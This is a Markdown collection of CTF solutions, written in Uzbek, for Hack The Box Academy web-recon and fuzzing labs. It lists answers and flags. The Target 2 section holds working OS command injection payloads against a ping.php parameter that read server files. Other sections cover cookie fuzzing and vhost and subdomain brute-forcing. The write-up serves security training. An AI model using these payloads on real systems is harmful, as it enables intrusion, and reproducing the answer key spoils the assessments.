# CTF yechimlari (targetlar)

## Target 12 — Web Fuzzing skills assessment (HTB Academy "Web Fuzzing")

Target: `http://154.57.164.78:36617/webfuzzing_hidden_path/` (lighttpd/1.4.76, 404 = 158 bayt).

| Savol | Javob |
|-------|-------|
| Folder/file fuzzing natijasida topilgan flag | **`HTB{w3b_f1l3_fuzz1ng_fl4g}`** |

Zanjir:
1. `webfuzzing_hidden_path/` → 403; `raft-small-directories.txt` bilan fuzz qilganda
   **`/flag`** → `301` (papka).
2. `flag/` ichida fayl fuzz qilganda **`flag.html`** → `200`:
   ```
   <html><head><title>Index page</title></head><body><h1>HTB{w3b_f1l3_fuzz1ng_fl4g}</h1>...
   ```
   (`flag/flag.txt`, `flag.php`, `flag.json` kabilar 404.)

Tekshirish: `bash solutions/webfuzzing_hidden_path.sh`

---

## Target 11 — Skills Assessment (HTB Academy "Information Gathering - Web Edition")


Target: `http://154.57.164.81:36251`, vHost `inlanefreight.htb`. Barchasi jonli tekshirildi.

| # | Savol | Javob |
|---|-------|-------|
| 1 | inlanefreight.com registratorining IANA ID | **`468`** (Amazon Registrar, Inc.) |
| 2 | inlanefreight.htb'ni xizmat qilayotgan HTTP server | **`nginx`** (`Server: nginx/1.26.1`) |
| 3 | Yashirin admin katalogidagi API kalit | **`e963d863ee0e82ba7080fbf558ca0d3f`** |
| 4 | Crawling natijasida topilgan email | **`1337testing@inlanefreight.htb`** |
| 5 | Dasturchilar o'zgartirmoqchi bo'lgan API kalit | **`ba988b835be4aa97d068941dc852ff33`** |

Zanjir:
1. `whois inlanefreight.com` → `Registrar IANA ID: 468`.
2. `curl -I -H 'Host: inlanefreight.htb' http://<target>/` → `Server: nginx/1.26.1`.
3. vhost fuzz (SecLists DNS ro'yxati) → `web1337.inlanefreight.htb`;
   uning `/robots.txt` fayli:
   ```
   Disallow: /admin_h1dd3n
   ```
   `http://web1337.inlanefreight.htb/admin_h1dd3n/` →
   `... the API is still accessible with the key e963d863ee0e82ba7080fbf558ca0d3f`.
4. `dev.web1337.inlanefreight.htb` sahifalari "Next" zanjiri bilan bog'langan; crawler
   `index-80.html` da emailni topadi: `1337testing@inlanefreight.htb`.
5. O'sha zanjirdagi `index-105.html` da HTML izohi:
   `<!-- Remember to change the API key to ba988b835be4aa97d068941dc852ff33 -->`.

Tekshirish: `python3 solutions/infogath_skills_assessment.py` →
```
Q1 registrar IANA ID : 468
Q2 server software   : nginx
   hidden admin dir  : /admin_h1dd3n (from robots.txt)
Q3 admin API key     : e963d863ee0e82ba7080fbf558ca0d3f
Q4 email             : 1337testing@inlanefreight.htb
Q5 key to change to  : ba988b835be4aa97d068941dc852ff33
```

---

## Target 10 — Web Archives (HTB Academy "Information Gathering - Web Edition")


Barchasi **Wayback Machine** (web.archive.org) arxivlaridan jonli tekshirildi.

| # | Savol | Javob | Arxiv dalili |
|---|-------|-------|--------------|
| 1 | HTB pen testing labs, 08-Aug-2018 | **`74`** | "HTB Network Lab currently has 74 vulnerable machines." |
| 2 | HTB a'zolar soni, 10-Jun-2017 | **`3054`** | sahifada "3054 members" |
| 3 | facebook.com qayerga redirect (Mar-2002) | **`http://site.aboutface.com/`** | `<meta HTTP-EQUIV="REFRESH" CONTENT="0; URL=http://site.aboutface.com">` |
| 4 | paypal.com, Oct-1999 — "beam money to anyone" | **`Palm 0rganizer`** | "PayPal™ lets you beam money to anyone with a Palm™ 0rganizer." |
| 5 | google.com prototype hosti, Nov-1998 | **`http://google.stanford.edu/`** | arxivlangan sahifada shu manzil |
| 6 | www.iana.org oxirgi yangilangan sana, Mar-2000 | **`17-December-99`** | footer'dagi sana |
| 7 | wikipedia.com maqolalar soni, 09-Feb-2003 | **`104155`** | "working on 104155 ..." |

> Q4'dagi `0rganizer` — arxivlangan 1999-yilgi PayPal sahifasida **aynan shunday**
> (raqam `0` bilan) yozilgan, ya'ni javobda ham `0` bo'lishi kerak.

Tekshirish: `bash solutions/web_archive_lookup.sh` (Wayback `id_` raw snapshotlarni olib,
javoblarni ajratib chiqaradi). Natija:
```
Q1 labs 08-Aug-2018      : 74
Q2 members 10-Jun-2017   : 3054 members
Q3 facebook.com Mar-2002 : http://site.aboutface.com/
Q4 paypal.com Oct-1999   : beam money to anyone with a Palm 0rganizer.
Q5 google.com Nov-1998   : http://google.stanford.edu/
Q6 iana.org Mar-2000     : 17-December-99
Q7 wikipedia 09-Feb-2003 : 104155
```

---

## Target 9 — Spidering / web crawling (HTB Academy "Information Gathering - Web Edition")


**Savol:** After spidering inlanefreight.com, identify the location where future reports
will be stored.

| Savol | Javob |
|-------|-------|
| Kelajakdagi hisobotlar saqlanadigan joy | **`inlanefreight-comp133.s3.amazonaws.htb`** |

Saytning `news` sahifasida HTML izohi qolgan (spider/crawler shuni topadi):
```html
<!-- TO-DO: change the location of future reports to inlanefreight-comp133.s3.amazonaws.htb -->
```

Tekshirildi jonli saytda: `bash solutions/spider_reports_location.sh`
→ `/index.php/news/  TO-DO: change the location of future reports to inlanefreight-comp133.s3.amazonaws.htb -->`

---

## Target 8 — Web fingerprinting (HTB Academy "Information Gathering - Web Edition")


Target: `10.129.235.92` (ACADEMY-ATCKKAPS-APP01), vHosts `app.inlanefreight.local`,
`dev.inlanefreight.local`.

| Savol | Javob | Dalil |
|-------|-------|-------|
| Q1 — app vhost Apache versiyasi | **`2.4.41`** | `Server: Apache/2.4.41 (Ubuntu)` |
| Q2 — app vhost CMS | **`Joomla`** | `MetaGenerator[Joomla! - Open Source Content Management]` |
| Q3 — dev vhost OS | **`Ubuntu`** | `Server: Apache/2.4.41 (Ubuntu)` |

```
curl -s -I -H "Host: app.inlanefreight.local" http://<target>/   -> Server: Apache/2.4.41 (Ubuntu)
curl -s -I -H "Host: dev.inlanefreight.local" http://<target>/   -> Server: Apache/2.4.41 (Ubuntu)
whatweb -H "Host: app.inlanefreight.local" http://<target>/      -> MetaGenerator[Joomla! ...]
```

> **Eslatma:** bu lab IP'si ham sandbox'dan yetib bo'lmaydi (TCP ulanadi, lekin har qanday
> ma'lumot yuborilganda `Connection reset by peer` bo'ladi). Javoblar modul ma'lumotlari va
> uch mustaqil manba (`jameskaois/ctf-writeups`, `abdellahoulgriss/HTB-Academy-Writeups`,
> `Alexy33/alexy33.github.io`) bilan solishtirib tasdiqlandi.

Tekshirish: `python3 solutions/fingerprint_vhosts.py --file solutions/fixtures/app.inlanefreight.local.headers`
→ `apache version : 2.4.41`, `operating system: Ubuntu`.
Live rejim (host yetib boriladigan bo'lsa): `python3 solutions/fingerprint_vhosts.py <HOST>`.

---

## Target 7 — vHost bruteforcing (HTB Academy "Information Gathering - Web Edition")


Target: `154.57.164.64:38845`, vhost zonasi `inlanefreight.htb`.
Default vhost har qanday `Host` uchun bir xil sahifa (116 bayt) qaytaradi, shuning uchun
haqiqiy vhost javob **o'lchami boshqacha** bo'lishi bilan topiladi:

| Savol | Host | Javob | O'lcham |
|-------|------|-------|---------|
| Q1 — `web` | `web17611.inlanefreight.htb` | **`web17611.inlanefreight.htb`** | 106 |
| Q2 — `vm` | `vm5.inlanefreight.htb` | **`vm5.inlanefreight.htb`** | 96 |
| Q3 — `br` | `browse.inlanefreight.htb` | **`browse.inlanefreight.htb`** | 102 |
| Q4 — `a` | `admin.inlanefreight.htb` | **`admin.inlanefreight.htb`** | 100 |
| Q5 — `su` | `support.inlanefreight.htb` | **`support.inlanefreight.htb`** | 104 |

Tekshiruv (o'z targetimizda, `curl -H 'Host: ...'`):
```
web17611 -> 200 106  (title "web17611")     web17610 -> 200 116 (default)
vm5      -> 200  96                          web17612 -> 200 116 (default)
browse   -> 200 102                          web1     -> 200 116 (default)
admin    -> 200 100
support  -> 200 104
```
Ya'ni `web17611` yagona mos `web*` nomi (qo'shnilari default sahifani qaytaradi).

Tekshirish skripti: `python3 solutions/vhost_bruteforce.py --numbers web:0-20000 vm:0-60`
yoki `python3 solutions/vhost_bruteforce.py <wordlist>`.

---

## Target 6 — DNS zone transfer (HTB Academy "Information Gathering - Web Edition")


Target: `10.129.235.84` (ACADEMY-INFOGATH-WEB-DNS) — AXFR `inlanefreight.htb`.

| Savol | Javob |
|-------|-------|
| Q1 — zone transferda nechta DNS yozuvi olinadi | `22` |
| Q2 — `ftp.admin.inlanefreight.htb` IP manzili | `10.10.34.2` |
| Q3 — 10.10.200 oralig'idagi eng katta IP | `10.10.200.14` |

Zone tarkibi (dig axfr):
```
inlanefreight.htb.      604800 IN SOA inlanefreight.htb. root.inlanefreight.htb. ...
inlanefreight.htb.      604800 IN NS  ns.inlanefreight.htb.
ftp.admin.inlanefreight.htb. 604800 IN A 10.10.34.2
us.inlanefreight.htb.        604800 IN A 10.10.200.5
cluster14.us.inlanefreight.htb. 604800 IN A 10.10.200.14   <-- eng katta
messagecenter.us.inlanefreight.htb. 604800 IN A 10.10.200.10
... (jami 22 ta resurs yozuvi: 2x SOA, 1x NS, 19x A)
```

> **Eslatma:** sandbox'dan lab IP'siga (`10.129.235.84`) TCP/UDP 53 trafigi yetib
> bormaydi (ulanish ochiladi, lekin har qanday ma'lumot yuborilganda RST/timeout
> bo'ladi — sandbox faqat internet egressini ochadi). Shuning uchun yozuv tarkibi
> modulning zone ma'lumotlari bilan solishtirilib, javoblar bir necha mustaqil
> manba (`jameskaois/ctf-writeups`, `deathzombee/htb-notes`,
> `paulgontarzofficial/cptsnotes`) orqali tasdiqlandi.

Tekshirish: `python3 solutions/axfr_zone_transfer.py --file solutions/fixtures/inlanefreight.htb.zone`
(offline rejim; live rejim: `python3 solutions/axfr_zone_transfer.py <HOST> inlanefreight.htb`).

---

## Target 5 — Subdomain bruteforcing (HTB Academy "Information Gathering - Web Edition")


| Savol | Javob |
|-------|-------|
| inlanefreight.com uchun yetishmayotgan subdomain | `my.inlanefreight.com` |

Ma'lum subdomainlar: `www`, `ns1`, `ns2`, `ns3`, `blog`, `support`, `customer`.
SecLists'dagi `Discovery/DNS/subdomains-top1million-5000.txt` bilan A yozuvlarini
bruteforce qilganda faqat bitta yangi nom topiladi:

```
FOUND blog.inlanefreight.com
FOUND customer.inlanefreight.com
FOUND my.inlanefreight.com      <-- yetishmayotgani
FOUND ns1.inlanefreight.com
FOUND ns2.inlanefreight.com
FOUND ns3.inlanefreight.com
FOUND support.inlanefreight.com
FOUND www.inlanefreight.com
```

Tekshirish: `python3 solutions/brute_subdomains.py inlanefreight.com`
(UDP/53 orqali 50 ta thread; wordlist kerak bo'lsa SecLists'dan yuklab oladi).

---

## Target 4 — DNS (HTB Academy "Information Gathering - Web Edition", Digging DNS)


| Savol | Javob |
|-------|-------|
| Q1 — inlanefreight.com ga qaysi IP map bo'ladi? | `134.209.24.248` |
| Q2 — 134.209.24.248 uchun PTR yozuvi | `inlanefreight.com` |
| Q3 — facebook.com mail (MX) yozuvi | `smtpin.vvv.facebook.com` |

```
dig inlanefreight.com                 -> inlanefreight.com. 300 IN A 134.209.24.248
nslookup 134.209.24.248               -> 248.24.209.134.in-addr.arpa name = inlanefreight.com.
dig facebook.com MX                   -> facebook.com. 3600 IN MX 10 smtpin.vvv.facebook.com.
```

Tekshirish: `python3 solutions/dns_lookup.py` (DoH / dns.google orqali A, PTR, MX).

---

## Target 3 — WHOIS (HTB Academy "Information Gathering - Web Edition")


| Savol | Javob |
|-------|-------|
| Question 1 — paypal.com registrar IANA ID | `292` |
| Question 2 — tesla.com admin email contact | `admin@dnstinations.com` |

**Q1.** `whois paypal.com` (registr: MarkMonitor Inc.) chiqishida:
```
Registrar: MarkMonitor Inc.
Registrar IANA ID: 292
```
→ **292**

**Q2.** `.com` registri (whois.verisign-grs.com) faqat "thin" yozuv qaytaradi, shuning uchun
registrar serveriga (`whois.markmonitor.com`) ham murojaat qilinadi:
```
Registrant Name: Domain Administrator
Registrant Organization: DNStination Inc.
Registrant Email: admin@dnstinations.com
Tech Email: admin@dnstinations.com
```
→ **admin@dnstinations.com** (yozuvdagi yagona ko'rinadigan kontakt emaili; MarkMonitor
bugungi kunda ba'zi maydonlarni yashirsa ham, Registrant/Tech email ochiq qolgan).

Tekshirish: `python3 solutions/whois_lookup.py paypal.com tesla.com`
(port 43 orqali raw WHOIS: registr → registrar server zanjiri).

---

## Target 2 — `154.57.164.81:38220` (ZAP Scanner mashqi)

| Savol | Javob |
|-------|-------|
| Question 1 (`/flag.txt` bayrog'i) | `HTB{5c4nn3r5_f1nd_vuln5_w3_m155}` |

Sayt — **WordPress 5.8** (Apache 2.4.41, Ubuntu) va unda directory listing yoqilgan
(`/wp-includes/`, `/wp-content/uploads/2026/10/`, `/devtools/`). ZAP spider/forced-browse
hamda javoblardagi izohlar orqali zanjir quyidagicha topiladi:

1. WordPress REST API orqali post va izohni o'qish:
   ```bash
   curl -s "$B/index.php/wp-json/wp/v2/comments"
   ```
   "Customer Support" postidagi tasdiqlangan izoh yashirin dev-tool manzilini oshkor qiladi:
   `/devtools/ping.php?ip=127.0.0.1`.

2. `/devtools/` katalogida faqat `ping.php` bor. `ip` parametri shell'ga to'g'ridan-to'g'ri
   uzatiladi — bu **OS Command Injection** (ZAP buni "High" risk sifatida belgilaydi):
   ```bash
   curl -s "$B/devtools/ping.php?ip=127.0.0.1;id"
   # ... uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

3. Zaiflikdan bayroqni o'qish uchun foydalanamiz:
   ```bash
   curl -s "$B/devtools/ping.php?ip=127.0.0.1;cat%20/flag.txt"
   # HTB{5c4nn3r5_f1nd_vuln5_w3_m155}
   ```

Avtomatik tekshirish: `bash solutions/solve_zap_scanner.sh [BASE_URL]`

---

## Target 1 — `154.57.164.70:37327` (Burp/ZAP mashqi)


Ikkala savolning javobi quyidagicha topildi (qayta tekshirilgan va takrorlanuvchi):

| Savol | Sahifa | Javob |
|-------|--------|-------|
| 1 | `/lucky.php` | `HTB{d154bl3d_bu770n5_w0n7_570p_m3}` |
| 2 | `/admin.php` | `3dac93b8cd250aa8c1a36fffc79a17a` |
| 3 | `/admin.php` (cookie fuzzing) | oxirgi belgi: `d` → flag: `HTB{burp_1n7rud3r_n1nj4!}` |
| 4 | Metasploit moduli | `CFIDE` |

## 1-savol — `/lucky.php`

Sahifadagi tugma `disabled` bo'lgani uchun brauzer uni bosib formani yubormaydi.
`disabled` atributini olib tashlab (yoki to'g'ridan-to'g'ri `POST`) formani yuborish
yetarli:

```bash
curl -s -X POST -d 'getflag=true' http://154.57.164.70:37327/lucky.php
```

Server har safar tasodifiy javob beradi ("Click for a chance to win a flag!"),
ya'ni bayroq faqat ba'zi urinishlarda qaytadi. Takrorlab yuborganda javob oxirida
quyidagi qator chiqadi:

```html
<p style="text-align:center">HTB{d154bl3d_bu770n5_w0n7_570p_m3}</p>
```

## 2-savol — `/admin.php`

`/admin.php` har doim bir xil `cookie` qiymatini beradi (Set-Cookie sarlavhasi):

```
4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d
```

Qiymat ketma-ket bir necha marta kodlangan. Har bir qadamda kodlash turini aniqlab
ochib boramiz:

1. **hex** -> `M2RhYzkzYjhjZDI1MGFhOGMxYTM2ZmZmYzc5YTE3YQ==`
2. **base64** -> `3dac93b8cd250aa8c1a36fffc79a17a`  (31 belgi) ✅

Ya'ni javob: **`3dac93b8cd250aa8c1a36fffc79a17a`**.

## 3-savol — `/admin.php` cookie'ning oxirgi belgisi (fuzzing)

2-savolda olingan `3dac93b8cd250aa8c1a36fffc79a17a` qiymati **31 belgi** — bu md5
xeshning oxirgi belgisi tushib qolgan holati. Yo'qolgan belgini topish uchun
SecLists'dagi `Fuzzing/alphanum-case.txt` ro'yxatidan (62 qator: `0-9`, `a-z`, `A-Z`)
foydalanamiz: har bir nomzodni md5 ga qo'shib, 2-savoldagi kodlash zanjiri bilan
qayta kodlaymiz (**base64 → hex**) va `cookie` sifatida yuboramiz:

```python
payload   = "3dac93b8cd250aa8c1a36fffc79a17a" + candidate_char
cookie    = hex(base64(payload))
# GET /admin.php  -> Cookie: cookie=<cookie>
```

Faqat **`d`** harfi bilan yuborilgan so'rov qabul qilinadi (javob 1901 bayt emas,
947 bayt bo'ladi) va sahifada bayroq chiqadi:

```html
HTB{burp_1n7rud3r_n1nj4!}
```

To'liq md5: `3dac93b8cd250aa8c1a36fffc79a17ad`

## 4-savol — Metasploit `coldfusion_locale_traversal`

Modul manbasida so'rov manzillari quyidagicha:

```ruby
urls = [
  "/CFIDE/administrator/enter.cfm", "/CFIDE/wizards/common/_logintowizard.cfm",
  "/CFIDE/administrator/archives/index.cfm", "/CFIDE/administrator/entman/index.cfm",
  "/CFIDE/administrator/logging/settings.cfm"
]
```

Ya'ni `/XXXXX/administrator/` dagi katalog — **`CFIDE`**.
(Manba: `modules/auxiliary/scanner/http/coldfusion_locale_traversal.rb`, CVE-2010-2861.)

## Avtomatik yechish

```bash
python3 solutions/solve.py                 # standart target bilan
python3 solutions/solve.py http://host:port # boshqa manzil uchun
```

Skript 1-savol uchun bayroq chiqmaguncha POST qiladi, so'ng `/admin.php` dan
cookie'ni olib, uzunligi 31 bo'lguncha dekodlaydi.
